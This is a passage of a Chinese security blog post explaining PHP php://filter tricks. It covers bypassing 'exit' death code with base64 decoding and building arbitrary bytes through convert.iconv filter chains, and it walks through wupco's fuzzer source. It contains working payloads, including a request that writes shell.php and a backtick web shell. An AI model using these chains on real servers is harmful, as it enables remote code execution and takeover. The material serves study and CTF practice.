class="hljs-comment">// 在strrr前面加以一个a</span><br><span class="hljs-variable">$strrr</span> = <span class="hljs-string">&quot;aPD9wa&lt;&gt;HA&lt;&gt;gZ&lt;?X&gt;hpdDsgPz4=&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$strrr</span>);<br>    <span class="hljs-comment">#Output: h������������?&gt;</span><br></code></pre></td></tr></table></figure><p>就会乱码。</p><p>那我们再回到这个问题，内容虽然被加上<code>&lt;?php exit; ?&gt;</code>，但前面的输入是可控的，不妨我们先使用<code>php://filter/write=convert.base64-decode</code> 来首先对其解码，这样只会剩下：<code>phpexit</code> 七个字符，到这我们再回头结合base64的解码规则——<strong>4个一解码</strong>，那么如果我们向下面这样构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$strrr</span> = <span class="hljs-string">&quot;&lt;?php exit; ?&gt;aPD9waHAgcGhwaW5mbygpOz8+&quot;</span>;<br><span class="hljs-comment">#Actual decoding:phpexitaPD9waHAgcGhwaW5mbygpOz8+</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$strrr</span>);<br><span class="hljs-comment"># OutPut：�^�+Z&lt;?php phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure><p>即：我们给<code>phpexit</code>增加一个字符使其正常解码,同时也确保我们后面的内容也正常解码。</p><p>最后payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GET：?filename=php:<span class="hljs-comment">//filter/write=convert.base64-decode/resource=shell.php</span><br>POST：content=aPD9waHAgcGhwaW5mbygpOz8+<br></code></pre></td></tr></table></figure><p>即可完成死亡绕过x</p><p>当然除了base64，还能使用rot13进行绕过，但其实原理都差不多，即使用filter过滤器进行构造，所以这里就不多赘述，接下来我们介绍filter过滤器中另外一个字符编码<code>Iconv</code>。</p><h3 id="Convert-iconv-amp-base64"><a href="#Convert-iconv-amp-base64" class="headerlink" title="Convert.iconv &amp; base64"></a>Convert.iconv &amp; base64</h3><h4 id="特性一-base64-en-x2F-decode"><a href="#特性一-base64-en-x2F-decode" class="headerlink" title="特性一 base64_en&#x2F;decode"></a><strong>特性一 base64_en&#x2F;decode</strong></h4><p>这里先提一个特性，看下面的base64加密解密过程：</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109003.png" alt="img"></p><p>我们将test当作base64解码再编码，重复多次我们还是可以得到test，当然前提是编码内容是4的倍数。</p><p>我们把这个记为 <strong>特性一</strong></p><p>（当然如果只有三个字符也可以（注意个数限制就只能是3） 但是根据base64特性，会在末尾补上&#x3D;，如果只是单纯的base64编码就无所谓啦，但我们后面还会涉及到其他编码的转换，&#x3D;会被过滤掉，那么多次编码解码后内容就不对了x）</p><h4 id="特性二-convert-iconv-字符转换"><a href="#特性二-convert-iconv-字符转换" class="headerlink" title="特性二 convert.iconv 字符转换"></a>特性二 convert.iconv 字符转换</h4><p>我们以原理的核心，也就是<code>convert.iconv</code>的<code>CSISO2022KR</code>为例子，看下面的这一串php代码：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.iconv.UTF8.CSISO2022KR/</span>resource=php:<span class="hljs-regexp">//</span>temp<br></code></pre></td></tr></table></figure><p>我们尝试输出它：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR/resource=php://temp&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<span class="hljs-comment"># Output：string(4) &quot;&quot; #这里&quot;&quot;中没有内容是因为编码的字符是不可见字符</span><br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>);<span class="hljs-comment"># Output：1b242943 （The hexcode of “.$)C”）</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072109126.png" alt="img"></p><p>当然现在可能不是很明显，我们尝试利用之前提到的PHPbase64的宽松性去强制解码再编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.UTF8.CSISO2022KR&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-decode&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;|convert.base64-encode/resource=data://,aaa&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;|convert.base64-encode/resource=data://,aaa&quot;</span>));<br><br><span class="hljs-comment">#Output:</span><br><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-encode&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br></code></pre></td></tr></table></figure><p>上述程序的输出如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">09</span>a69a <br><span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;     ��&quot;</span><br><br>php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">43616161</span><br><span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;Caaa&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110112.png" alt="img"></p><p>这里先解释一下为什么不用php:&#x2F;&#x2F;temp，根据base64的宽松性，我们在上面提到过，这个解码过程可以这样理解：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;|[^a-z0-9A-Z+/]|s&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$input</span>);<br></code></pre></td></tr></table></figure><p>所以当我们调用decode的时候首先会对非法字符进行置空，只剩下C和剩下的字符一起解码，那么我们想要还原这个C，按照base64encode的原理，至少需要4个字符，所以我们这里使用了resource&#x3D;data:&#x2F;&#x2F;,aaa让C和三个a一起解码。</p><h4 id="利用——构造base64表内任意字符"><a href="#利用——构造base64表内任意字符" class="headerlink" title="利用——构造base64表内任意字符"></a>利用——构造base64表内任意字符</h4><p>在特性二中我们利用编码转换构造了一个C的base64decode串，那么能否利用<code>iconv</code>的特性构造其他字符呢？</p><p>答案是可以的，只要构造的字符在base64表内，那么就能通过不停的拼接<code>iconv</code>支持的编码，不断的利用base64特性去除非法字符，然后留下特定字符进行构造。</p><p>那么我们就可以构造<code>A-Za-z0-9+/=</code>任意字符。</p><p>既然这样，我们能否在把脑洞开大一点，我们既然能构造base64表中的任意字符，那我们讲这一串字符再进行一次base64解码不就相当于，我们能够构造不受限制的任意字符了么？！！！</p><h4 id="构造任意payload的base64形式"><a href="#构造任意payload的base64形式" class="headerlink" title="构造任意payload的base64形式"></a>构造任意payload的base64形式</h4><p>根据上面的结论，理论上我们可以对任意payload的base64进行构造，只需要通过编码不断扩展就行，比如下面这一个过程：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&quot;</span>;<br><span class="hljs-variable">$url_2</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&quot;</span>;<br><span class="hljs-variable">$url_3</span> = <span class="hljs-string">&quot;php://filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&quot;</span>;<br><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-decode&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;|convert.base64-encode/resource=data://,aaa&quot;</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>));<br><br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;|convert.base64-encode&quot;</span>;<br><span class="hljs-variable">$url</span> .= <span class="hljs-string">&quot;/resource=data://,aaa&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$url</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$var</span>).<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$url</span>));<br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br>d5a69a<br><span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;զ�&quot;</span><br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">31616161</span> <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;1aaa&quot;</span><br><br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br>db569a <span class="hljs-keyword">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;�V�&quot;</span><br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">32316161</span> <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;21aa&quot;</span><br><br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br>dccdb569a6 <span class="hljs-keyword">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;�͵i�&quot;</span><br>php:<span class="hljs-comment">//filter/convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode/resource=data://,aaa</span><br><span class="hljs-number">334</span>d3231 <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;3M21&quot;</span><br></code></pre></td></tr></table></figure><p>可以看到 当我们增加对应字符的编码串的时候 他会在原字符串的前端生成对应字符。</p><p>那么思路就明确了，比如我们要构造生成下面这样的php payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`<span class="hljs-variable">$_GET</span>[<span class="hljs-number">0</span>]`;;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>我们只需要构造他的base64形式的反转形式最后解码，就能在字符串前端生成我们的payload了</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">PD89YCRfR0VUWzBdYDs7Pz4=` ——&gt; `4zP7sDYdBzWUV0RfRCY98DP<br></code></pre></td></tr></table></figure><h4 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h4><p>在了解基本原理之后，我们要做的就是使用编码构造一份字典，对应base64编码中每一个合法字符。</p><p>wupco师傅已经开源过fuzz的项目了，所以我们在下面的项目分析里面直接跟进就好x</p><h2 id="项目分析"><a href="#项目分析" class="headerlink" title="项目分析"></a>项目分析</h2><h3 id="PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco"><a href="#PHP-INCLUDE-TO-SHELL-CHAR-DICT-wupco" class="headerlink" title="PHP_INCLUDE_TO_SHELL_CHAR_DICT @wupco"></a><a href="https://github.com/wupco/PHP_INCLUDE_TO_SHELL_CHAR_DICT">PHP_INCLUDE_TO_SHELL_CHAR_DICT</a> @wupco</h3><p>在根据wupco师傅项目的同时把fuzz原理也一并阐述</p><p>（因为师傅的项目里面都写好了hhh~所以我就简单注释一下代码都做了什么x）</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110923.png" alt="img"></p><p>先简单说一下各个文件是做什么的x</p><ul><li>res文件夹中是fuzz好的字典，每个文件名对应一个字符hexcode，文件内容是fuzz好的链子x</li></ul><p>（<code>2f</code> the hexcode of “<code>/</code>“)</p><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110119.png" alt="img"></p><ul><li><code>fuzzer.php</code>是用于fuzz构建res字典的核心程序，通过以现有的（通常是以C的编码：<code>convert.iconv.L1.ISO2022KR</code>为基础进行编码变异，逐步构建其他其他字符。</li><li><code>init</code>构建时候利用的文件，即<code>resource=</code>指向的文件，默认为<code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM</code>（足够的长x）</li><li><code>test.py</code>用于生成filter链，他会匹配字典中对应字符的hexcode进行拼接，同时会在<code>test.php</code>中生成对应的样例程序：</li></ul><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110603.png" alt="img"></p><ul><li><code>test.php</code>由<code>test.py</code>生成的包含对应payload的测试样例，包含<code>test.py</code>中<code>file_to_use</code>变量指向的文件：</li></ul><p><img src="https://nssctf.wdf.ink//img/WDTJ/202302072110801.png" alt="img"></p><ul><li><code>phpresult</code>一个对<code>/etc/passwd</code>利用后的样例（？看样子是成功给&#x2F;etc&#x2F;passwd文件写入了payload（？</li></ul><p>每个文件大概做什么我们就介绍完了，下面跟进两个核心部分，一个是fuzz脚本一个是生成脚本(<a href="http://test.py/">test.py</a>):</p><ul><li>fuzz.php</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL &amp; ~E_WARNING);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;memory_limit&quot;</span>, <span class="hljs-string">&quot;-1&quot;</span>);<br><br><span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./init&quot;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./init&#x27;</span>,<span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM&#x27;</span>);<br> &#125;<br><span class="hljs-variable">$input</span> = <span class="hljs-string">&#x27;./init&#x27;</span>;<br><br><span class="hljs-variable">$iconv_list</span> = [<span class="hljs-string">&#x27;437&#x27;</span>,<span class="hljs-string">&#x27;500&#x27;</span>,<span class="hljs-string">&#x27;500V1&#x27;</span>,<span class="hljs-string">&#x27;850&#x27;</span>,<span class="hljs-string">&#x27;851&#x27;</span>.....];<span class="hljs-comment">// iconv -l生成，太长了所以省略，你也可以在这里定义你想用到的编码集</span><br><span class="hljs-variable">$filter_list</span> = [<br>   <span class="hljs-string">&#x27;string.rot13&#x27;</span>,<span class="hljs-comment">// seem no use</span><br>    <span class="hljs-string">&#x27;convert.iconv.*&#x27;</span>,<br>];<br><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$filter_list</span>);<br><br><span class="hljs-variable">$prev_str</span> = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment"># 存储上一个成功的字符链</span><br><span class="hljs-comment">// $news = &quot;&quot;; #好像没意义x</span><br><span class="hljs-comment">// $found_count = 0; #好像没意义x</span><br><span class="hljs-variable">$op_all</span> = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">#一般是res中的链子当作种子</span><br><br><span class="hljs-variable">$op_all_max</span> = <span class="hljs-number">2000</span>; <span class="hljs-comment">#链的最大长度</span><br><span class="hljs-variable">$last_op</span> = <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment"># 上一个拼接的链子</span><br><span class="hljs-variable">$init_value</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$input</span>);<br><span class="hljs-variable">$max_c_len</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$init_value</span>) * <span class="hljs-number">5</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-string">&#x27;./res&#x27;</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">&#x27;./res&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./res/C&quot;</span>))&#123;<br>   <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;./res/C&#x27;</span>,<span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>); <span class="hljs-comment">#是所有链子的开始，是变异的基础，也是忘不掉的那个人</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getseeds</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>)</span>&#123; <span class="hljs-comment">//获取文件夹中的所有文件名</span><br>    <span class="hljs-variable">$handler</span> = <span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-variable">$dir</span>);  <br>    <span class="hljs-keyword">while</span> ((<span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$handler</span>)) !== <span class="hljs-literal">false</span>) <br>    &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$filename</span> !== <span class="hljs-string">&quot;.&quot;</span> &amp;&amp; <span class="hljs-variable">$filename</span> !== <span class="hljs-string">&quot;..&quot;</span>) <br>        &#123;  <br>            <span class="hljs-variable">$files</span>[] = <span class="hljs-variable">$filename</span> ;  <br>        &#125; <br>    &#125;  <br>    <span class="hljs-title function_ invoke__">closedir</span>(<span class="hljs-variable">$handler</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$files</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getRandomSeedFromDir</span>(<span class="hljs-params"><span class="hljs-variable">$dir</span></span>)</span>&#123; <span class="hljs-comment">//因为这段代码冗余部分太多所以简化成函数了方便理解</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">getseeds</span>(<span class="hljs-variable">$dir</span>);<br>    <span class="hljs-variable">$r_t</span> = <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-number">999999</span>) % <span class="hljs-title function_ invoke__">sizeof</span>(<span class="hljs-variable">$files</span>);<br>    <span class="hljs-variable">$seed</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$dir</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$files</span>[<span 